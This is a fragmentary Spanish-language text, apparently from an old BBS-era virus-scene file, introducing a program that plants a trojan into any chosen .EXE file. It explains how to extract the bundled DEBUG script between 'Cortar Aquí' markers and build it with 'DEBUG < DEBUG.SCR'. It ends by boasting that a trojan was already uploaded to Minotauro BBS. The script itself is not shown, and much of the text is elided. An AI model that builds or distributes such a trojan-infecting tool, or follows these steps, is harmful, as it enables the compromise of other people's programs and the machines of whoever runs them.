...
Bueno, este es un pequeño programa que hice para erradicar una molestia que
...
El programa instalará un troyano en cualquier archivo .EXE que uno quiera.
...
mismo a un archivo .COM ejecutable, tienen que hacer lo siguiente:
  ...
  o Eliminar Todo el Texto que se encuentra antes y despues de las lineas
    que dicen 'Cortar Aquí', incluyendo estas lineas también.
    De esta manera les quedará un archivo, SOLO con el script del debug.

  o a continuación tipeen: DEBUG < DEBUG.SCR
...
intención, ya que el mismo fue hecho ESPECIALMENTE para Minotauro BBS.
...
NOTA: Un troyano ya fué subido a Minotauro BBS (no voy a decir por quien ;))
